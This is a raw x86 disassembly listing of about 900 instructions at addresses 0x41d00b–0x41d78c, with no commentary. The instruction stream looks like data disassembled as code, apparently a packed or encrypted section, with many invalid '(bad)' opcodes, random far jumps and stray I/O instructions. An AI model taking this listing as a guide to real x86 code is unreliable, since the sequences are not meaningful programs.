  41d00b:	mov    bl,0xc0
  41d00d:	xor    bh,BYTE PTR [eax-0x6fef2284]
  41d013:	mov    ah,0xe2
  41d015:	mov    al,0x2c
  41d017:	cmp    DWORD PTR [edi],edx
  41d019:	aam    0x53
  41d01b:	sbb    eax,0x96371d6b
  41d020:	and    edi,esi
  41d022:	ud1    eax,DWORD PTR [esi-0x190f6706]
  41d029:	stc    
  41d02a:	cdq    
  41d02b:	mov    al,0x91
  41d02d:	xor    DWORD PTR [ecx-0x33],eax
  41d030:	or     al,dl
  41d032:	je     0x41d08e
  41d034:	and    edi,DWORD PTR [ecx+0x57]
  41d037:	aam    0x8d
  41d039:	aaa    
  41d03a:	pushf  
  41d03b:	iret   
  41d03c:	mov    ch,0x5d
  41d03e:	retf   0x364d
  41d041:	pop    ebp
  41d042:	dec    esi
  41d043:	aam    0x78
  41d045:	mov    eax,0xa0a160ad
  41d04a:	int    0x4d
  41d04c:	xor    al,0x30
  41d04e:	inc    ecx
  41d04f:	sbb    ebp,DWORD PTR [ebx-0x98d0597]
  41d055:	imul   ebx,edx,0x2a725609
  41d05b:	in     al,dx
  41d05c:	jg     0x41cffa
  41d05e:	xor    BYTE PTR [edx+0x41],bh
  41d061:	mov    ch,0xb4
  41d063:	jo     0x41d08f
  41d065:	and    al,0x92
  41d067:	pop    edx
  41d068:	rol    DWORD PTR [ecx+edx*4+0x71],1
  41d06c:	sbb    BYTE PTR [ebx+0x27fa5c40],al
  41d072:	mov    ss,ebx
  41d074:	cmp    edi,edi
  41d076:	(bad)  
  41d077:	lds    eax,FWORD PTR [ecx-0x74c42b8a]
  41d07d:	jp     0x41d00c
  41d07f:	jnp    0x41d028
  41d081:	inc    ecx
  41d082:	adc    dh,BYTE PTR [edx-0x7ea1cfd3]
  41d088:	mov    dh,0xb5
  41d08a:	add    DWORD PTR [edi],edi
  41d08c:	inc    ebx
  41d08d:	mov    esi,0x85f60d5c
  41d092:	je     0x41d071
  41d094:	repnz imul eax,DWORD PTR [edi],0xffffff8d
  41d098:	xor    al,0xd6
  41d09a:	aam    0xee
  41d09c:	or     edx,edi
  41d09e:	mov    edi,0x9ad07b15
  41d0a3:	push   esi
  41d0a4:	and    al,0xdc
  41d0a6:	bt     DWORD PTR [ebp-0x2750a21c],eax
  41d0ad:	xchg   esi,eax
  41d0ae:	cld    
  41d0af:	fist   DWORD PTR [edi-0x62]
  41d0b2:	add    al,0x55
  41d0b4:	(bad)  
  41d0b5:	jp     0x41d0f4
  41d0b7:	pop    edi
  41d0b8:	daa    
  41d0b9:	ins    BYTE PTR es:[edi],dx
  41d0ba:	(bad)  
  41d0bc:	ror    DWORD PTR [esi],1
  41d0be:	jg     0x41d0e0
  41d0c0:	sub    DWORD PTR [esi-0x7dfd9475],eax
  41d0c6:	xor    esp,DWORD PTR ds:0xfdf8f6d4
  41d0cc:	jno    0x41d0ba
  41d0ce:	lea    esi,[ebp+0x7b]
  41d0d1:	pop    ebp
  41d0d2:	push   eax
  41d0d3:	in     al,dx
  41d0d4:	jp     0x41d130
  41d0d6:	cmp    DWORD PTR [ebx],eax
  41d0d8:	out    0xa3,al
  41d0da:	pop    esp
  41d0db:	add    BYTE PTR [ebp-0x786ff704],ch
  41d0e1:	(bad)  
  41d0e2:	sbb    dl,BYTE PTR [di]
  41d0e5:	pop    ecx
  41d0e6:	jle    0x41d095
  41d0e8:	in     eax,0xf
  41d0ea:	(bad)  
  41d0eb:	fnsave [edx]
  41d0ed:	xor    al,0x73
  41d0ef:	lds    edx,FWORD PTR [edx]
  41d0f1:	add    ebx,eax
  41d0f3:	jmp    0x1807:0x1c514da4
  41d0fa:	(bad)  [ebx-0x50d51587]
  41d100:	mov    ah,0xfe
  41d102:	std    
  41d103:	lock fnstcw WORD PTR [esi-0x33]
  41d107:	loop   0x41d13b
  41d109:	out    dx,al
  41d10a:	shr    BYTE PTR [ecx],1
  41d10c:	stos   BYTE PTR es:[edi],al
  41d10d:	std    
  41d10e:	and    edi,DWORD PTR [esi-0x7403bcab]
  41d114:	inc    ebp
  41d115:	sar    DWORD PTR [ebx],1
  41d117:	imul   ebp,DWORD PTR [edi],0x64
  41d11a:	push   edx
  41d11b:	fsub   QWORD PTR [ecx-0x6]
  41d11e:	or     al,0x97
  41d120:	(bad)  [esi+0x38]
  41d123:	arpl   WORD PTR [esi+0x1aefc6c8],bp
  41d129:	push   esp
  41d12a:	ret    
  41d12b:	imul   ebx,edx,0xffffffae
  41d12e:	jno    0x41d1a1
  41d130:	push   esp
  41d131:	(bad)  
  41d132:	mov    al,0x40
  41d134:	out    0xce,eax
  41d136:	pushf  
  41d137:	loopne 0x41d15b
  41d139:	cwde   
  41d13a:	jb     0x41d0e4
  41d13c:	test   al,0x38
  41d13e:	cli    
  41d13f:	adc    bl,BYTE PTR [ecx-0x2a]
  41d142:	sub    BYTE PTR [edi+esi*8+0x29],bl
  41d146:	lods   al,BYTE PTR ds:[esi]
  41d147:	inc    edi
  41d148:	cmp    DWORD PTR [ebp+0x6f62e2f4],ebx
  41d14e:	enter  0x592c,0xbf
  41d152:	mov    ch,0xe1
  41d154:	js     0x41d111
  41d156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d157:	fistp  DWORD PTR [esi]
  41d159:	cmp    BYTE PTR [ebp-0x424499ba],ah
  41d15f:	js     0x41d181
  41d161:	jge    0x41d194
  41d163:	bound  esp,QWORD PTR ds:0xa937cb29
  41d169:	xchg   esp,eax
  41d16a:	cmp    eax,0x4d9ca9f5
  41d16f:	in     eax,dx
  41d170:	lock dec eax
  41d172:	popf   
  41d173:	je     0x41d10f
  41d175:	test   DWORD PTR [esi-0x33aa7584],esp
  41d17b:	jnp    0x41d192
  41d17d:	jne    0x41d130
  41d17f:	addr16 adc dh,bh
  41d182:	aam    0x1c
  41d184:	bound  ebx,QWORD PTR [edx-0x73d581f2]
  41d18a:	xchg   edx,eax
  41d18b:	xchg   edx,eax
  41d18c:	or     DWORD PTR [ebx],ebx
  41d18e:	pop    esi
  41d18f:	mov    gs:0x7831cd7b,al
  41d195:	mov    dl,0x0
  41d197:	jl     0x41d15c
  41d199:	xor    DWORD PTR [edi+0x245e5c57],eax
  41d19f:	mov    DWORD PTR [eax],esp
  41d1a1:	dec    eax
  41d1a2:	mov    ?,WORD PTR es:[esi-0x14c23e4f]
  41d1a9:	and    eax,0x1f3c7c88
  41d1ae:	ret    
  41d1af:	jb     0x41d201
  41d1b1:	fidivr DWORD PTR [ecx]
  41d1b3:	pop    ebp
  41d1b4:	leave  
  41d1b5:	mov    edi,0xb1879ce5
  41d1ba:	cwde   
  41d1bb:	xchg   edx,eax
  41d1bc:	or     DWORD PTR [ebp-0x27b81b7],ecx
  41d1c2:	mov    dh,0x1
  41d1c4:	fsubr  st,st(5)
  41d1c6:	sti    
  41d1c7:	stos   BYTE PTR es:[edi],al
  41d1c8:	rol    ah,0xdf
  41d1cb:	and    bl,bh
  41d1cd:	int    0x54
  41d1cf:	cmp    ecx,DWORD PTR [esi]
  41d1d1:	rcl    DWORD PTR ds:0x6274c978,1
  41d1d7:	ret    0x5a2e
  41d1da:	jb     0x41d205
  41d1dc:	scas   al,BYTE PTR es:[edi]
  41d1dd:	xchg   esp,eax
  41d1de:	dec    edi
  41d1df:	push   edx
  41d1e0:	jmp    0xf8bc:0xc103b4b0
  41d1e7:	ror    BYTE PTR [esi-0x59241954],cl
  41d1ed:	enter  0xb8db,0xa7
  41d1f1:	push   ss
  41d1f2:	sbb    al,0xf3
  41d1f4:	out    dx,eax
  41d1f5:	sbb    BYTE PTR [eax-0x7e1bf9f7],cl
  41d1fb:	lahf   
  41d1fc:	dec    eax
  41d1fd:	aas    
  41d1fe:	ret    
  41d1ff:	fwait
  41d200:	cmp    DWORD PTR [esi+ecx*4-0x6cc566a5],0xffffffea
  41d208:	js     0x41d195
  41d20a:	inc    edx
  41d20b:	or     DWORD PTR [edx-0x7b],ecx
  41d20e:	mov    ecx,esi
  41d210:	adc    al,0x4c
  41d212:	loope  0x41d1ce
  41d214:	cs dec eax
  41d216:	push   cs
  41d217:	jl     0x41d19d
  41d219:	iret   
  41d21a:	cmp    al,0x2
  41d21c:	xchg   BYTE PTR [ebp+eiz*8+0x43],dh
  41d220:	add    DWORD PTR [ebx+edx*2-0x71e496db],esi
  41d227:	scas   al,BYTE PTR es:[edi]
  41d228:	or     al,0x1f
  41d22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d22b:	addr16 stc 
  41d22d:	inc    ecx
  41d22e:	push   ebx
  41d22f:	out    0xeb,eax
  41d231:	ss inc ebp
  41d233:	pop    ebx
  41d234:	cld    
  41d235:	rcl    DWORD PTR [edx-0x41],cl
  41d238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d239:	mov    WORD PTR [esi+0x5a],cs
  41d23c:	add    ah,al
  41d23e:	popa   
  41d23f:	rol    al,1
  41d241:	jmp    0x4ff13b6b
  41d246:	shl    DWORD PTR [edx-0x1a25fb02],cl
  41d24c:	inc    BYTE PTR [edx]
  41d24e:	dec    edi
  41d24f:	outs   dx,DWORD PTR ds:[esi]
  41d250:	cs ja  0x41d282
  41d253:	pop    esp
  41d254:	add    eax,0x4314aa51
  41d259:	and    BYTE PTR [ecx+0x2b],al
  41d25c:	shl    ecx,cl
  41d25e:	xor    BYTE PTR [edx-0x76],ch
  41d261:	pop    ebx
  41d262:	jl     0x41d208
  41d264:	adc    eax,0xd3e5eb79
  41d269:	cmp    al,0xc9
  41d26b:	inc    edx
  41d26c:	push   esi
  41d26d:	jb     0x41d29b
  41d26f:	lods   al,BYTE PTR ds:[esi]
  41d270:	in     eax,0xa8
  41d272:	sbb    eax,0x740027df
  41d277:	ds retf 
  41d279:	mov    esp,0xd33491c9
  41d27e:	dec    edx
  41d27f:	cmc    
  41d280:	loope  0x41d205
  41d282:	dec    esp
  41d283:	cli    
  41d284:	icebp  
  41d285:	dec    esp
  41d286:	inc    esi
  41d287:	inc    esi
  41d288:	jmp    0x43ed:0x669f3eb4
  41d28f:	sub    al,BYTE PTR [edi-0x43]
  41d292:	mov    bl,0xe3
  41d294:	leave  
  41d295:	(bad)  
  41d296:	jl     0x41d2f0
  41d298:	into   
  41d299:	lahf   
  41d29a:	jno    0x41d2c4
  41d29c:	jae    0x41d2dc
  41d29e:	aam    0xc1
  41d2a0:	xchg   esi,eax
  41d2a1:	fs pop ss
  41d2a3:	lock icebp 
  41d2a5:	sub    BYTE PTR [ebx],0xbc
  41d2a8:	sbb    bh,BYTE PTR [eax+0x3f385d68]
  41d2ae:	fcmovnu st,st(2)
  41d2b0:	(bad)  
  41d2b1:	xchg   ecx,eax
  41d2b2:	cdq    
  41d2b3:	xchg   ebp,eax
  41d2b4:	lods   al,BYTE PTR ds:[esi]
  41d2b5:	jmp    0x41d2be
  41d2b7:	cli    
  41d2b8:	and    edx,DWORD PTR [edi+0x5e]
  41d2bb:	mov    edi,0x92adf814
  41d2c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2c1:	xor    dh,BYTE PTR ds:0x946f2197
  41d2c7:	iret   
  41d2c8:	adc    BYTE PTR [eax-0x30826457],ah
  41d2ce:	clc    
  41d2cf:	sbb    BYTE PTR [ebp-0x23],ah
  41d2d2:	(bad)  
  41d2d3:	out    dx,al
  41d2d4:	repnz push ss
  41d2d6:	aad    0xdc
  41d2d8:	jmp    0x57769866
  41d2dd:	ins    BYTE PTR es:[edi],dx
  41d2de:	pop    ecx
  41d2df:	lahf   
  41d2e0:	inc    esi
  41d2e1:	mov    ds:0xd1f1cb93,eax
  41d2e6:	retf   0x2fa6
  41d2e9:	neg    BYTE PTR [eax-0x10]
  41d2ec:	outs   dx,DWORD PTR ds:[esi]
  41d2ed:	mov    ah,0x89
  41d2ef:	sbb    al,0xd5
  41d2f1:	fdiv   QWORD PTR ds:0x704bcb33
  41d2f7:	cwde   
  41d2f8:	scas   al,BYTE PTR es:[edi]
  41d2f9:	outs   dx,BYTE PTR ds:[esi]
  41d2fa:	(bad)  
  41d2fb:	repnz fs and eax,0x11449037
  41d302:	mov    ebp,0xd3d2b9e0
  41d307:	repnz mov ah,0xa1
  41d30a:	mov    DWORD PTR [esi+0x62],ecx
  41d30d:	and    dh,BYTE PTR [eax+0x7c]
  41d310:	clc    
  41d311:	xchg   ebp,eax
  41d312:	(bad)  
  41d314:	mov    eax,ds:0x5f78051d
  41d319:	jle    0x41d35d
  41d31b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d31c:	inc    ebx
  41d31d:	mov    esp,0x268e155e
  41d322:	mov    edi,DWORD PTR [esi+eiz*1]
  41d325:	jmp    0x41d391
  41d327:	int    0x9c
  41d329:	enter  0x231e,0x22
  41d32d:	mov    edx,cs
  41d32f:	addr16 sbb eax,0xc0db24dc
  41d335:	inc    edx
  41d336:	inc    ebx
  41d337:	mov    ah,0xf0
  41d339:	rcl    BYTE PTR [eax-0x32befe21],0x71
  41d340:	in     eax,dx
  41d341:	adc    ch,dl
  41d343:	sbb    eax,0xabb25415
  41d348:	outs   dx,BYTE PTR ds:[esi]
  41d349:	in     eax,0xc2
  41d34b:	test   DWORD PTR [ecx+esi*4],eax
  41d34e:	lds    ecx,FWORD PTR [ecx+0x41a1eab6]
  41d354:	int    0x5e
  41d356:	std    
  41d357:	bound  ebp,QWORD PTR [edi+0x5f]
  41d35a:	sub    DWORD PTR [edi+edx*2-0x4fee3616],edi
  41d361:	push   esi
  41d362:	mov    cl,bl
  41d364:	call   0x1406f362
  41d369:	pop    esp
  41d36a:	scas   eax,DWORD PTR es:[di]
  41d36c:	(bad)  
  41d36d:	sub    BYTE PTR [edx+0x74e1a9ff],cl
  41d373:	loop   0x41d3c5
  41d375:	or     al,cl
  41d377:	dec    edi
  41d378:	mov    cl,0x8
  41d37a:	push   edx
  41d37b:	pop    ebp
  41d37c:	ss fwait
  41d37e:	push   ecx
  41d37f:	sub    bh,BYTE PTR [edx+0x3be6691c]
  41d385:	cmp    cl,BYTE PTR [ecx]
  41d387:	dec    ebp
  41d388:	jle    0x41d35d
  41d38a:	fsub   QWORD PTR [edx+0x7a]
  41d38d:	and    DWORD PTR [esi+0x6c],0x3c831d3e
  41d394:	xor    ch,BYTE PTR [edx-0x9]
  41d397:	jmp    0x41d36b
  41d399:	mul    DWORD PTR [eax+0x2f]
  41d39c:	fadd   DWORD PTR [eax+0x32]
  41d39f:	out    dx,eax
  41d3a0:	rcl    DWORD PTR [esi],cl
  41d3a2:	sahf   
  41d3a3:	xchg   BYTE PTR [edx-0x34],dl
  41d3a6:	sahf   
  41d3a7:	pusha  
  41d3a8:	xchg   edi,eax
  41d3a9:	fdivr  st(6),st
  41d3ab:	adc    cl,bl
  41d3ad:	repz cmc 
  41d3af:	adc    eax,0x3a7379f6
  41d3b4:	push   ds
  41d3b5:	mov    dh,dl
  41d3b7:	mov    esp,0xa385ea84
  41d3bc:	cmp    dl,BYTE PTR [ecx]
  41d3be:	dec    eax
  41d3bf:	dec    edx
  41d3c0:	sbb    al,0x3e
  41d3c2:	pop    esp
  41d3c3:	xchg   ecx,eax
  41d3c4:	inc    ecx
  41d3c5:	les    ebp,FWORD PTR [ecx+0x6ae496a6]
  41d3cb:	cwde   
  41d3cc:	loop   0x41d396
  41d3ce:	sbb    eax,0xa014389
  41d3d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d4:	adc    eax,0xbb2f802c
  41d3d9:	add    eax,0x265e5f78
  41d3de:	push   edi
  41d3df:	inc    edi
  41d3e0:	cmp    BYTE PTR [ebx-0x69],al
  41d3e3:	mov    esp,0xcb0b9fec
  41d3e8:	mov    bh,0x34
  41d3ea:	addr16 int 0x61
  41d3ed:	jae    0x41d454
  41d3ef:	retf   
  41d3f0:	jmp    0xbd655c1f
  41d3f5:	mov    eax,0xed077f6c
  41d3fa:	cmp    eax,0x84512d7e
  41d3ff:	retf   
  41d400:	cli    
  41d401:	cmc    
  41d402:	mov    edx,0x25ba8066
  41d407:	push   ss
  41d408:	scas   al,BYTE PTR es:[edi]
  41d409:	pop    ecx
  41d40a:	clc    
  41d40b:	jmp    0x4bfb:0xf6bd1e90
  41d412:	enter  0xe847,0x1f
  41d416:	add    DWORD PTR [edi-0x7c],ebx
  41d419:	aad    0xb5
  41d41b:	repnz rcr DWORD PTR cs:[edx],1
  41d41f:	pop    edx
  41d420:	fsub   QWORD PTR [edi+0x2271b893]
  41d426:	sub    DWORD PTR [ecx+edi*4],edi
  41d429:	mov    DWORD PTR [edx-0x5910d59d],edi
  41d42f:	clc    
  41d430:	dec    DWORD PTR [edi+0x3d]
  41d433:	mov    bl,0x76
  41d435:	loopne 0x41d46d
  41d437:	push   eax
  41d438:	outs   dx,DWORD PTR ds:[esi]
  41d439:	retf   0x35b6
  41d43c:	sub    eax,0xed40073b
  41d441:	enter  0x5b32,0xb8
  41d445:	int    0x8a
  41d447:	adc    bh,BYTE PTR [eax-0x73a57dc4]
  41d44d:	nop
  41d44e:	icebp  
  41d44f:	nop
  41d450:	stc    
  41d451:	or     dh,BYTE PTR [eax+0x39]
  41d454:	push   edi
  41d455:	ror    edx,1
  41d457:	inc    ecx
  41d458:	aad    0xdf
  41d45a:	loop   0x41d499
  41d45c:	rol    eax,cl
  41d45e:	add    edx,edx
  41d460:	jmp    0x41d412
  41d462:	loopne 0x41d470
  41d464:	pop    eax
  41d465:	mov    edi,0x4cdc4496
  41d46a:	push   DWORD PTR [ebx-0x4b]
  41d46d:	clc    
  41d46e:	iret   
  41d46f:	out    dx,eax
  41d470:	xor    eax,0xaddcbb19
  41d475:	sar    DWORD PTR [ebp+esi*4-0x620abe1f],1
  41d47c:	test   al,0x62
  41d47e:	jle    0x41d493
  41d480:	mov    ecx,0xab809737
  41d485:	(bad)  
  41d486:	dec    edi
  41d488:	not    DWORD PTR [esi+0x5bfec9ea]
  41d48e:	jmp    0xb4a75a52
  41d493:	mov    edi,0x49252e01
  41d499:	mov    esi,0xdc5fbacf
  41d49e:	add    DWORD PTR [ebx],0xaebd2b2a
  41d4a4:	cdq    
  41d4a5:	retf   
  41d4a6:	xor    eax,0x20ec00c8
  41d4ab:	jmp    0xd587:0x785aaea2
  41d4b2:	div    edi
  41d4b4:	sub    DWORD PTR [eax-0x59bd855f],esi
  41d4ba:	add    DWORD PTR [ebx+0x30],ecx
  41d4bd:	mov    bh,BYTE PTR [ebx+0x6123f312]
  41d4c3:	inc    ecx
  41d4c4:	add    eax,0xc1c60b9
  41d4c9:	jmp    0x41d46b
  41d4cb:	pop    ds
  41d4cc:	std    
  41d4cd:	sub    DWORD PTR [ecx+eiz*1-0x434bfaf7],ebp
  41d4d4:	inc    edi
  41d4d5:	cwde   
  41d4d6:	repnz (bad) 
  41d4d8:	ret    0x3263
  41d4db:	and    al,0x21
  41d4dd:	jecxz  0x41d537
  41d4df:	cmp    esp,DWORD PTR [edx]
  41d4e1:	ror    BYTE PTR [edi],1
  41d4e3:	jp     0x41d53b
  41d4e5:	sub    eax,0x4daa5b92
  41d4ea:	pop    eax
  41d4eb:	inc    edi
  41d4ec:	xor    bh,BYTE PTR [ebx]
  41d4ee:	xchg   bx,ax
  41d4f0:	es in  eax,0xd3
  41d4f3:	ds inc esp
  41d4f5:	aad    0x2d
  41d4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4f8:	mov    DWORD PTR [esi+eax*2+0x77ae1491],edx
  41d4ff:	sbb    BYTE PTR [eax+0x1aa55086],al
  41d505:	std    
  41d506:	fcmovbe st,st(6)
  41d508:	enter  0x4773,0xc8
  41d50c:	bswap  esp
  41d50e:	bound  ebp,QWORD PTR [ebp+0x39]
  41d511:	push   esi
  41d512:	ror    BYTE PTR [esi],cl
  41d514:	mov    eax,ds:0x99aae02
  41d519:	into   
  41d51a:	(bad)  
  41d51c:	pop    esi
  41d51d:	pop    ds
  41d51e:	mov    al,ds:0x6deddfbd
  41d523:	sub    bh,BYTE PTR [esi]
  41d525:	and    eax,0x218fa0f4
  41d52a:	sar    esp,0x76
  41d52d:	iret   
  41d52e:	fcomp  QWORD PTR [edi+0xd]
  41d531:	xchg   ecx,eax
  41d532:	and    eax,esi
  41d534:	and    eax,0x7cf94b99
  41d539:	(bad)  
  41d53a:	push   ebp
  41d53b:	repz icebp 
  41d53d:	xchg   edi,eax
  41d53e:	loopne 0x41d5af
  41d540:	in     eax,dx
  41d541:	jecxz  0x41d4f3
  41d543:	pop    eax
  41d544:	(bad)  
  41d545:	addr16 ror dh,1
  41d548:	mov    ds:0x6a4aff81,al
  41d54d:	or     eax,DWORD PTR [esi+ebp*4-0x28]
  41d551:	out    dx,eax
  41d552:	and    ebp,DWORD PTR [edi]
  41d554:	repz jecxz 0x41d4e1
  41d557:	mov    eax,ds:0x3260373e
  41d55c:	xchg   ebp,eax
  41d55d:	and    DWORD PTR [edx+0x8],0x7cbb65e2
  41d564:	aas    
  41d565:	int    0x46
  41d567:	jg     0x41d5af
  41d569:	cli    
  41d56a:	jnp    0x41d5e7
  41d56c:	xor    eax,0x8a632949
  41d571:	scas   eax,DWORD PTR es:[edi]
  41d572:	cmp    bl,BYTE PTR [edx+0x41]
  41d575:	mov    ah,0xb7
  41d577:	fcmovnb st,st(6)
  41d579:	dec    ebp
  41d57a:	fsub   st(7),st
  41d57c:	pop    edx
  41d57d:	shr    DWORD PTR [ecx+esi*8-0x50],1
  41d581:	jae    0x41d5ff
  41d583:	pusha  
  41d584:	stos   DWORD PTR es:[edi],eax
  41d585:	inc    edx
  41d586:	out    0x54,al
  41d588:	jecxz  0x41d516
  41d58a:	inc    edx
  41d58b:	jmp    0x41d5f9
  41d58d:	pop    ebx
  41d58e:	or     DWORD PTR [esi+0x38d8638c],0x75409fcd
  41d598:	pop    ecx
  41d599:	fild   QWORD PTR [eax-0x10]
  41d59c:	fiadd  DWORD PTR [ebp-0x60]
  41d59f:	fild   DWORD PTR [edi+0x203cae82]
  41d5a5:	pop    ecx
  41d5a6:	das    
  41d5a7:	pop    ss
  41d5a8:	sbb    esi,DWORD PTR [eax-0x7723c573]
  41d5ae:	cmp    bl,0xbc
  41d5b1:	jb     0x41d589
  41d5b3:	movlps QWORD PTR [ebp-0x5c],xmm5
  41d5b7:	ins    BYTE PTR es:[edi],dx
  41d5b8:	aam    0xc7
  41d5ba:	lds    eax,FWORD PTR gs:[eax]
  41d5bd:	scas   al,BYTE PTR es:[edi]
  41d5be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5bf:	(bad)  
  41d5c1:	xor    BYTE PTR [ecx],dh
  41d5c3:	sahf   
  41d5c4:	pop    eax
  41d5c5:	dec    edi
  41d5c6:	(bad)  
  41d5c7:	pop    edi
  41d5c9:	mov    al,ds:0xbe20540c
  41d5ce:	out    0x4b,eax
  41d5d0:	adc    dl,ah
  41d5d2:	out    dx,eax
  41d5d3:	icebp  
  41d5d4:	int3   
  41d5d5:	call   0x4e3d:0xb0e9bcb1
  41d5dc:	lods   eax,DWORD PTR ds:[esi]
  41d5dd:	loopne 0x41d579
  41d5df:	push   0xffffffab
  41d5e1:	dec    esp
  41d5e2:	div    BYTE PTR [edi]
  41d5e4:	call   0x4e745b2
  41d5e9:	mov    edx,0x13dbfc94
  41d5ee:	outs   dx,DWORD PTR ds:[esi]
  41d5ef:	sbb    eax,0xdd667d94
  41d5f4:	mov    dl,BYTE PTR [ebx]
  41d5f6:	inc    ebp
  41d5f7:	fst    DWORD PTR [esi]
  41d5f9:	and    al,0x1e
  41d5fb:	ror    DWORD PTR [ecx-0x6eae4c8b],cl
  41d601:	mov    cl,0xde
  41d603:	xchg   ecx,eax
  41d604:	inc    ebx
  41d605:	shr    BYTE PTR [esp+ebp*8-0x97fb408],0x11
  41d60d:	pop    esi
  41d60e:	inc    esp
  41d60f:	mov    ecx,0x2f5cd7d
  41d614:	js     0x41d5a8
  41d616:	add    DWORD PTR [edi],edi
  41d618:	bound  ecx,QWORD PTR [ebx+0x63]
  41d61b:	jl     0x41d5c2
  41d61d:	xor    BYTE PTR [esi+0x296a8946],0xb5
  41d624:	shr    DWORD PTR [edx-0x56fa96],1
  41d62a:	(bad)  
  41d62b:	gs mov edi,0xe4ba6e27
  41d631:	inc    ebx
  41d632:	int3   
  41d633:	push   0xaa4e0f93
  41d638:	loope  0x41d694
  41d63a:	iret   
  41d63b:	daa    
  41d63c:	sub    eax,DWORD PTR [edx-0x60]
  41d63f:	fld    DWORD PTR [eax+0x6041b667]
  41d645:	dec    esi
  41d646:	dec    esi
  41d647:	rcl    ah,cl
  41d649:	or     eax,0x73301d35
  41d64e:	cld    
  41d64f:	mov    ebx,0x567d370d
  41d654:	imul   edx,ebp,0xdc980b85
  41d65a:	out    dx,al
  41d65b:	iret   
  41d65c:	test   BYTE PTR [ecx-0x62],cl
  41d65f:	xchg   esi,eax
  41d660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d661:	fld    TBYTE PTR [edi+0xc]
  41d664:	and    al,0xa0
  41d667:	inc    edi
  41d668:	outs   dx,DWORD PTR ds:[esi]
  41d669:	xchg   BYTE PTR [ebx-0x6eda5d14],ch
  41d66f:	jae    0x41d5ff
  41d671:	jecxz  0x41d677
  41d673:	retf   
  41d674:	mov    edx,0xb297b381
  41d679:	adc    BYTE PTR [ecx],bh
  41d67b:	jns    0x41d6cd
  41d67d:	cmp    eax,0xf2a427b5
  41d682:	(bad)  
  41d683:	jle    0x41d693
  41d685:	(bad)  [eax]
  41d687:	cli    
  41d688:	push   ds
  41d689:	loopne 0x41d66f
  41d68b:	lods   al,BYTE PTR ds:[esi]
  41d68c:	stos   DWORD PTR es:[edi],eax
  41d68d:	sub    DWORD PTR [ebx],edx
  41d68f:	or     DWORD PTR ds:0x17386729,edi
  41d695:	cmp    BYTE PTR [esp+ebx*1+0xc],bh
  41d699:	mov    bh,0xfa
  41d69b:	orps   xmm2,xmm2
  41d69e:	outs   dx,BYTE PTR ds:[esi]
  41d69f:	enter  0xde0f,0x90
  41d6a3:	and    BYTE PTR [ebx+0x689246fc],ch
  41d6a9:	icebp  
  41d6aa:	push   ds
  41d6ab:	fild   DWORD PTR [ebx-0xb03fac9]
  41d6b1:	fidiv  DWORD PTR [ecx]
  41d6b3:	pop    ss
  41d6b4:	mov    ch,0x4c
  41d6b6:	shr    DWORD PTR [edi],0xda
  41d6b9:	fld    TBYTE PTR [eax]
  41d6bb:	push   esi
  41d6bc:	mov    ah,0xa3
  41d6be:	shr    BYTE PTR [esp+ecx*8],0xb6
  41d6c2:	xchg   edi,eax
  41d6c3:	enter  0xd725,0xd8
  41d6c7:	outs   dx,BYTE PTR ds:[esi]
  41d6c8:	ret    0xd7b9
  41d6cb:	std    
  41d6cc:	mov    eax,ds:0xbaacfe23
  41d6d1:	mov    ds:0xa2f56d06,eax
  41d6d6:	push   ecx
  41d6d7:	cdq    
  41d6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6d9:	loope  0x41d70b
  41d6db:	pusha  
  41d6dc:	push   cs
  41d6dd:	sar    DWORD PTR [ebx-0x2b90e4ac],0xf5
  41d6e4:	sub    eax,DWORD PTR [edx-0x3b]
  41d6e7:	inc    ebx
  41d6e8:	jmp    0xb9fdbe23
  41d6ed:	dec    eax
  41d6ee:	pop    ss
  41d6ef:	pminub mm5,QWORD PTR [esi+edx*1-0x7c9f46b8]
  41d6f7:	jecxz  0x41d694
  41d6f9:	nop
  41d6fa:	out    0x26,eax
  41d6fc:	mov    ecx,0xfc069b7d
  41d701:	xchg   ebp,eax
  41d702:	pop    esp
  41d703:	push   esp
  41d704:	test   eax,0xfa5147a4
  41d709:	in     eax,0xc
  41d70b:	scas   al,BYTE PTR es:[edi]
  41d70c:	int    0xe0
  41d70e:	lock jg 0x41d697
  41d711:	cmp    BYTE PTR [ecx-0x2e57200b],ch
  41d717:	out    0x2d,eax
  41d719:	repnz mov dh,BYTE PTR ds:[eax+0x11713401]
  41d721:	rol    DWORD PTR [ebx+0x77],1
  41d724:	std    
  41d725:	pop    edx
  41d726:	dec    ebx
  41d727:	aam    0x3b
  41d729:	fs ret 
  41d72b:	mov    ch,0x46
  41d72d:	jno    0x41d6bb
  41d72f:	add    DWORD PTR [ecx],ecx
  41d731:	jg     0x41d6c5
  41d733:	in     al,0x74
  41d735:	sbb    BYTE PTR [eax-0x11647e12],0xd9
  41d73c:	pop    eax
  41d73d:	je     0x41d794
  41d73f:	jns    0x41d769
  41d741:	inc    ecx
  41d742:	sti    
  41d743:	jo     0x41d71b
  41d745:	arpl   di,ax
  41d747:	ret    0x37b8
  41d74a:	mov    dh,0xd3
  41d74c:	xchg   DWORD PTR [ecx+0x456f559a],ebx
  41d752:	jp     0x41d734
  41d754:	xchg   ecx,eax
  41d755:	scas   eax,DWORD PTR es:[edi]
  41d756:	mov    ch,0xb5
  41d758:	ret    
  41d759:	and    ebp,edi
  41d75b:	mov    ah,BYTE PTR [edi+0x7872f074]
  41d761:	stos   BYTE PTR es:[edi],al
  41d762:	or     al,0xc3
  41d764:	pop    esi
  41d765:	test   al,0x63
  41d767:	mov    ebx,edi
  41d769:	mov    cl,0x1a
  41d76b:	aam    0xfd
  41d76d:	mov    al,0x7a
  41d76f:	in     al,dx
  41d770:	sbb    DWORD PTR [ebp-0xa7770ba],0xffffffe9
  41d777:	cmc    
  41d778:	mov    dh,cl
  41d77a:	ret    0xbf48
  41d77d:	mov    DWORD PTR ds:0x3682ba6c,ecx
  41d783:	inc    edx
  41d784:	repnz frstor [edx]
  41d787:	fadd   DWORD PTR [edi]
  41d789:	inc    esi
  41d78a:	jp     0x41d731
  41d78c:	test   ebp,ecx
